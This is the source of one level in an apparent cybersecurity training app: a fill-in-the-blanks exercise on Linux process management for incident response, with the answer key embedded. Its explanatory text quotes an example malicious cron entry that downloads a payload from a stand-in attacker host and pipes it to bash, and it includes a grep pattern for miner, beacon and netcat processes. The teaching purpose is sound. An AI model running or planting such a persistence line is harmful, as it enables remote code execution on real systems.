// src/screens/cyber-security/stage2/CY2_Level3.jsx — Process Management (FILL)
import { useState } from 'react';
import CY2Shell from './CY2Shell';

const BLANKS = [
  { id:'B1', answer:'ps aux',       hint:'All processes with user, PID, CPU, memory, command' },
  { id:'B2', answer:'kill -9',      hint:'Force kill — SIGKILL, cannot be ignored by the process' },
  { id:'B3', answer:'systemctl',    hint:'Manage systemd services — start, stop, status, enable' },
  { id:'B4', answer:'crontab -l',   hint:'List scheduled cron jobs for current user' },
  { id:'B5', answer:'lsof -i',      hint:'List open network connections by process' },
  { id:'B6', answer:'top',          hint:'Live interactive process monitor — q=quit, k=kill' },
  { id:'B7', answer:'pgrep',        hint:'Find PID by process name' },
];

const LINES = [
  '# See all running processes',
  '[B1]                         # snapshot of everything running',
  '[B6]                         # live updating, sorted by CPU',
  '',
  '# Find a suspicious process',
  '[B1] | grep -i "miner\\|beacon\\|nc "',
  '[B7] -l python               # find PID of python processes',
  '',
  '# Kill a process',
  'kill 1234                    # SIGTERM — ask nicely',
  '[B2] 1234                    # SIGKILL — force stop',
  '',
  '# Manage services',
  '[B3] status ssh              # is SSH daemon running?',
  '[B3] stop nginx              # stop web server',
  '[B3] disable cups            # disable print service (reduces attack surface)',
  '',
  '# Check for malware persistence (cron)',
  '[B4]                         # your cron jobs',
  'cat /etc/cron.d/*            # system-wide cron',
  'cat /etc/crontab             # main crontab',
  '',
  '# See active network connections per process',
  '[B5]                         # spot unexpected connections',
  '[B5] | grep ESTABLISHED      # active connections only',
];

export default function CY2_Level3() {
  const [vals, setVals] = useState({});
  const [checked, setChecked] = useState(false);
  const [correct, setCorrect] = useState({});

  function check() {
    const r = {};
    BLANKS.forEach(b => { r[b.id]=(vals[b.id]||'').trim().toLowerCase()===b.answer.toLowerCase(); });
    setCorrect(r); setChecked(true);
  }
  const allCorrect = checked && BLANKS.every(b => correct[b.id]);

  function renderLine(line, idx) {
    if (line.startsWith('#')) return <div key={idx} style={{color:'#475569',fontStyle:'italic',padding:'1px 0'}}>{line}</div>;
    if (!line.trim()) return <div key={idx} style={{height:8}}/>;
    const parts = line.split(/(\[B\d\])/g);
    return (
      <div key={idx} style={{padding:'1px 0',color:'#cbd5e1',whiteSpace:'pre-wrap'}}>
        {parts.map((p,i)=>{
          const m=p.match(/^\[B(\d)\]$/); if(!m) return <span key={i}>{p}</span>;
          const bid='B'+m[1]; const bl=BLANKS.find(b=>b.id===bid);
          const st=!checked?'':correct[bid]?'correct':'incorrect';
          return <input key={i} className={`cy2-blank ${st}`} value={vals[bid]||''} onChange={e=>setVals(v=>({...v,[bid]:e.target.value}))} placeholder={bl?.hint} style={{minWidth:90,whiteSpace:'normal'}}/>;
        })}
      </div>
    );
  }

  return (
    <CY2Shell levelId={3} canProceed={allCorrect}
      conceptReveal={[
        { label:'Cron as Persistence Mechanism', detail:'Malware uses cron to survive reboots: */1 * * * * curl http://attacker.com/payload | bash — every minute, download and execute. During incident response, ALWAYS check crontab -l, /etc/cron.d/, /etc/crontab, and /var/spool/cron/. Malware often hides here.' },
        { label:'lsof -i for C2 Detection', detail:'Command and Control (C2) malware maintains a connection to the attacker\'s server. lsof -i shows every process with a network connection. An unknown process with an ESTABLISHED connection to an unusual IP is a major red flag. Combine with netstat -tulpn to see what\'s listening.' },
      ]}
    >
      <div className="cy2-intro">
        <h1>Process Management</h1>
        <p className="cy2-tagline">⚙️ Find malware, kill rogue processes, investigate persistence.</p>
        <p className="cy2-why">During incident response: what processes are running? Which ones have network connections? What\'s scheduled in cron? These commands answer those questions in seconds.</p>
      </div>
      <div className="cy2-panel">
        <div className="cy2-panel-hdr">⚙️ Process Management — fill the blanks</div>
        <div className="cy2-panel-body">{LINES.map(renderLine)}</div>
      </div>
      <button className="cy2-check-btn" onClick={check}>Check Answers</button>
      {checked && <div className={`cy2-feedback ${allCorrect?'success':'error'}`}>{allCorrect?'✅ Process management mastered.':'❌ Check your answers — include flags.'}</div>}
    </CY2Shell>
  );
}
